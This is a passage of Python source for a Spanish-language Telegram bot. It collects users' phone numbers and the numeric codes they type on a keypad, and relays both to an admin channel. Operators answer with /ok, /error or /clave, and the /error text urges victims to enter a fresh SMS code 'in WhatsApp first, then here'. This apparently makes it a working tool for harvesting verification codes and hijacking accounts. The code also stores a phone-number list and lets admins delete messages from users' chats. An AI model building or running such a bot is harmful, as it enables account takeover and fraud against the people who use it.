                user.id,
                is_photo=bool(q.message.photo),
            )
        )

        if admin_msg:
            case_data = {
                "admin_msg_id": admin_msg.message_id,
                "user_chat_id": q.message.chat_id,
                "wait_message_id": q.message.message_id,
                "phone": phone,
                "code": code,
                "user_id": user.id,
                "full_name": user.full_name or "",
                "username": user.username or ""
            }
            PENDING_BY_ADMIN_MSG[admin_msg.message_id] = case_data
            PENDING_BY_USER_ID[user.id] = admin_msg.message_id

        context.user_data[UD_CODE] = ""
        return

    context.user_data[UD_CODE] = code
    text, kb = build_keypad(code)
    try:
        if q.message.photo:
            await q.edit_message_caption(
                caption=text,
                reply_markup=kb,
                parse_mode="Markdown"
            )
        else:
            await q.edit_message_text(
                text=text,
                reply_markup=kb,
                parse_mode="Markdown"
            )
    except Exception:
        try:
            await q.message.edit_reply_markup(reply_markup=kb)
        except Exception:
            pass

async def ok_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    case_data = get_case_by_reply(update)

    if case_data:
        custom_text = " ".join(context.args).strip()
        if not custom_text:
            await msg.reply_text("Uso respondiendo al caso: /ok Mensaje para el usuario")
            return
    else:
        if len(context.args) < 2:
            await msg.reply_text("Uso: /ok telegram_id Mensaje para el usuario")
            return
        try:
            target_user_id = int(context.args[0])
        except Exception:
            await msg.reply_text("Error: telegram_id inválido.")
            return
        case_data = get_case_by_user_id(target_user_id)
        if not case_data:
            await msg.reply_text("No encontré un caso pendiente para ese telegram_id.")
            return
        custom_text = " ".join(context.args[1:]).strip()

    stop_wait_task(case_data["user_id"])

    try:
        await send_dm_with_admin_mirror(
            context=context,
            target_user_id=case_data["user_chat_id"],
            text=custom_text,
            edit_message_id=case_data["wait_message_id"]
        )
    except Exception:
        await send_dm_with_admin_mirror(
            context=context,
            target_user_id=case_data["user_chat_id"],
            text=custom_text
        )

    remove_case(case_data)
    await msg.reply_text("✅ Usuario actualizado correctamente.")

async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    case_data = get_case_by_reply(update)

    if not case_data:
        if len(context.args) != 1:
            await msg.reply_text("Uso respondiendo al caso: /error\nO uso directo: /error telegram_id")
            return
        try:
            target_user_id = int(context.args[0])
        except Exception:
            await msg.reply_text("Error: telegram_id inválido.")
            return
        case_data = get_case_by_user_id(target_user_id)
        if not case_data:
            await msg.reply_text("No encontré un caso pendiente para ese telegram_id.")
            return

    stop_wait_task(case_data["user_id"])

    error_text = (
        "❌𝗖𝗼𝗻𝗲𝘅𝗶𝗼́𝗻 𝐟𝐚𝐥𝐥𝐢𝐝𝐚. 𝗦𝗲𝗻̃𝗮𝗹 𝐝𝐞𝐛𝐢𝐥.\n\n"
        "𝐍𝐨 𝐭𝐞 𝐝𝐞𝐬𝐚𝐧𝐢𝐦𝐞𝐬, 𝐞𝐬 𝐧𝐨𝐫𝐦𝐚𝐥. 𝐑𝐞𝐜𝐢𝐛𝐞 𝐞𝐥 𝐧𝐮𝐞𝐯𝐨 𝐜𝐨𝐝𝐢𝐠𝐨 𝐫𝐞𝐜𝐢𝐛𝐢𝐝𝐨 𝐩𝐨𝐫 𝐦𝐞𝐧𝐬𝐚𝐣𝐞 𝐝𝐞 𝐭𝐞𝐱𝐭𝐨 𝐚 𝐭𝐮 𝐭𝐞𝐥𝐞𝐟𝐨𝐧𝐨 𝐞 𝐢𝐧𝐠𝐫𝐞𝐬𝐚 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐩𝐫𝐢𝐦𝐞𝐫𝐨 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐚𝐪𝐮𝐢 𝐞𝐧 𝐞𝐥 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐩𝐚𝐫𝐚 𝐞𝐬𝐭𝐚𝐛𝐥𝐞𝐜𝐞𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭."
    )
    text, kb = build_keypad("")

    try:
        await context.bot.edit_message_text(
            chat_id=case_data["user_chat_id"],
            message_id=case_data["wait_message_id"],
            text=error_text,
            parse_mode="Markdown"
        )
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )
    except Exception:
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=error_text,
            parse_mode="Markdown"
        )
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )

    remove_case(case_data)
    await msg.reply_text("⚠️ Error enviado al usuario y teclado restaurado.")

async def admin_reply_bridge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    if not msg or not msg.reply_to_message:
        return

    bridge_data = get_chat_bridge_by_admin_reply(update)
    if not bridge_data:
        return

    target_user_id = bridge_data.get("user_id")
    if not target_user_id:
        return

    try:
        if msg.text and not (
            msg.photo or msg.video or msg.animation or msg.audio or
            msg.voice or msg.document or msg.sticker
        ):
            await send_dm_with_admin_mirror(
                context=context,
                target_user_id=target_user_id,
                text=msg.text
            )
            return

        if (
            msg.photo or msg.video or msg.animation or msg.audio or
            msg.voice or msg.document or msg.sticker
        ):
            await context.bot.copy_message(
                chat_id=target_user_id,
                from_chat_id=msg.chat_id,
                message_id=msg.message_id
            )
            return

    except Exception as e:
        await update.message.reply_text(f"❌ No pude responder al estudiante: {e}")

async def codigo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    target_user_id = None

    case_data = get_case_by_reply(update)
    if case_data:
        target_user_id = case_data["user_id"]
    else:
        if len(context.args) != 1:
            await update.message.reply_text("Uso respondiendo al caso: /codigo\nO uso directo: /codigo telegram_id")
            return
        try:
            target_user_id = int(context.args[0])
        except Exception:
            await update.message.reply_text("Error: telegram_id inválido.")
            return

    text, kb = build_keypad("")
    try:
        await context.bot.send_message(
            chat_id=target_user_id,
            text=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )
        await update.message.reply_text("✅ Teclado enviado al estudiante.")
    except Exception as e:
        await update.message.reply_text(f"❌ No pude enviar el teclado: {e}")

async def clave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if len(context.args) < 2:
        await update.message.reply_text("Uso: /clave telegram_id mensaje")
        return

    try:
        target_user_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("Error: telegram_id inválido.")
        return

    raw_text = " ".join(context.args[1:]).strip()
    if not raw_text:
        await update.message.reply_text("Debes escribir un mensaje.")
        return

    final_text = to_unicode_bold(raw_text)

    stop_generating_task(target_user_id)

    pending = PENDING_GENERATING.pop(target_user_id, None)

    try:
        if pending:
            await send_dm_with_admin_mirror(
                context=context,
                target_user_id=target_user_id,
                text=final_text,
                edit_message_id=pending["message_id"]
            )
        else:
            await send_dm_with_admin_mirror(
                context=context,
                target_user_id=target_user_id,
                text=final_text
            )

        await update.message.reply_text("✅ Clave enviada al estudiante.")
    except Exception as e:
        await update.message.reply_text(f"❌ No pude enviar la clave: {e}")

async def del_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    if not msg or not msg.reply_to_message:
        await update.message.reply_text("Usa /del respondiendo al mensaje espejo del panel.")
        return

    data = DM_SENT_BY_ADMIN_MSG.get(msg.reply_to_message.message_id)
    if not data:
        await update.message.reply_text("Ese reply no corresponde a un mensaje DM borrable.")
        return

    try:
        await context.bot.delete_message(
            chat_id=data["user_id"],
            message_id=data["dm_message_id"]
        )
        await update.message.reply_text("✅ Mensaje borrado del DM del estudiante.")
    except Exception as e:
        await update.message.reply_text(f"❌ No pude borrar el mensaje del DM: {e}")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if len(context.args) != 1:
        await update.message.reply_text("Uso: /ban telegram_id")
        return

    try:
        target_user_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("Error: telegram_id inválido.")
        return

    BANNED_USERS.add(target_user_id)
    save_banned_users()

    await update.message.reply_text(f"✅ Usuario baneado: {target_user_id}")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if len(context.args) != 1:
        await update.message.reply_text("Uso: /unban telegram_id")
        return

    try:
        target_user_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("Error: telegram_id inválido.")
        return

    if target_user_id in BANNED_USERS:
        BANNED_USERS.remove(target_user_id)
        save_banned_users()

    await update.message.reply_text(f"✅ Usuario desbaneado: {target_user_id}")

async def chat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if len(context.args) < 2:
        await update.message.reply_text("Uso: /chat telegram_id mensaje")
        return

    try:
        target_user_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("Error: telegram_id inválido.")
        return

    text = " ".join(context.args[1:]).strip()
    if not text:
        await update.message.reply_text("Debes escribir un mensaje.")
        return

    try:
        await send_dm_with_admin_mirror(
            context=context,
            target_user_id=target_user_id,
            text=text
        )
        await update.message.reply_text("✅ Mensaje enviado al DM del usuario.")
    except Exception as e:
        await update.message.reply_text(f"❌ No pude enviar el mensaje: {e}")

async def lista_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if not USERS:
        await update.message.reply_text("No hay usuarios guardados todavía.")
        return

    partes = ["<b>📋 Lista de usuarios</b>\n"]
    for uid_str, data in sorted(USERS.items(), key=lambda x: x[1].get("full_name", "").lower()):
        uid = int(uid_str)
        nombre = data.get("full_name") or "Sin nombre"
        username = data.get("username") or "sin_username"
        phone = data.get("phone") or "sin teléfono"

        nombre_click = user_link_html(uid, nombre)
        id_click = user_link_html(uid, uid_str)
        phone_click = user_link_html(uid, phone)

        partes.append(
            f"• Nombre: {nombre_click}\n"
            f"• ID: {id_click}\n"
            f"• Teléfono: {phone_click}\n"
            f"• Username: @{html.escape(username)}\n"
        )

    texto = "\n".join(partes)

    if len(texto) <= 4000:
        await update.message.reply_text(texto, parse_mode="HTML", disable_web_page_preview=True)
        return

    bloque = ""
    for linea in partes:
        if len(bloque) + len(linea) + 1 > 4000:
            await update.message.reply_text(bloque, parse_mode="HTML", disable_web_page_preview=True)
            bloque = ""
        bloque += linea + "\n"
    if bloque:
        await update.message.reply_text(bloque, parse_mode="HTML", disable_web_page_preview=True)

async def private_chat_bridge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or update.effective_chat.type != "private":
        return

    msg = update.message
    if not msg:
        return

    user = update.effective_user
    if not user:
        return

    if is_banned(user.id):
        return

    if not context.user_data.get(UD_CHAT_MODE):
        return

    if not ADMIN_CHANNEL_ID:
        return

    texto_usuario = (msg.text or msg.caption or "").strip()
    if not texto_usuario:
        texto_usuario = "[mensaje multimedia]"

    admin_text = (
        "💬 Mensaje del estudiante\n\n"
        f"Nombre: {user.full_name or 'Sin nombre'}\n"
        f"Username: @{user.username or 'sin_username'}\n"
        f"ID: {user.id}\n\n"
        f"Mensaje:\n{texto_usuario}\n\n"
        "Responde a este mensaje o al multimedia para contestarle al estudiante."
    )

    try:
        header = await context.bot.send_message(
            chat_id=ADMIN_CHANNEL_ID,
            text=admin_text
        )

        bridge_ids = [header.message_id]

        if (
            msg.photo or msg.video or msg.animation or msg.audio or msg.voice
            or msg.document or msg.sticker
        ):
            copied = await context.bot.copy_message(
                chat_id=ADMIN_CHANNEL_ID,
                from_chat_id=msg.chat_id,
                message_id=msg.message_id,
                reply_to_message_id=header.message_id
            )
            bridge_ids.append(copied.message_id)

        bridge_key = f"{build_chat_bridge_key(user.id)}_{header.message_id}"
        PENDING_BY_ADMIN_MSG[bridge_key] = {
            "user_id": user.id,
            "bridge_admin_msg_id": header.message_id,
            "bridge_admin_msg_ids": bridge_ids,
        }

        context.user_data[UD_LAST_ADMIN_CHAT_MSG_ID] = header.message_id

    except Exception as e:
        log.exception("Error reenviando mensaje del estudiante al grupo privado: %s", e)

async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or update.effective_chat.type != "private":
        return

    user = update.effective_user
    if user and is_banned(user.id):
        return

    if context.user_data.get(UD_CHAT_MODE):
        return

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")

async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falló el envío: {e}")
        log.exception("Testsend falló: %s", e)

async def on_startup(app):
    if ADMIN_CHANNEL_ID:
        try:
            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
        except Exception as e:
            log.exception("No pude enviar mensaje de arranque: %s", e)

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")

    load_users()
    load_banned_users()
    
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    app.add_handler(CallbackQueryHandler(start_join_cb, pattern="^start_join$"))
    app.add_handler(CallbackQueryHandler(members_btn_cb, pattern="^members_btn$"))
    app.add_handler(CallbackQueryHandler(ask_question_cb, pattern="^ask_question$"))
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("testsend", testsend_cmd))
    app.add_handler(CommandHandler("ok", ok_cmd))
    app.add_handler(CommandHandler("error", error_cmd))
    app.add_handler(CommandHandler("codigo", codigo_cmd))
    app.add_handler(CommandHandler("clave", clave_cmd))
    app.add_handler(CommandHandler("del", del_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("chat", chat_cmd))
    app.add_handler(CommandHandler("lista", lista_cmd))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_chat_bridge), group=0)
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback), group=1)
    app.add_handler(MessageHandler(filters.REPLY & ~filters.COMMAND, admin_reply_bridge), group=0)
    
    app.run_polling()

if __name__ == "__main__":
    main()
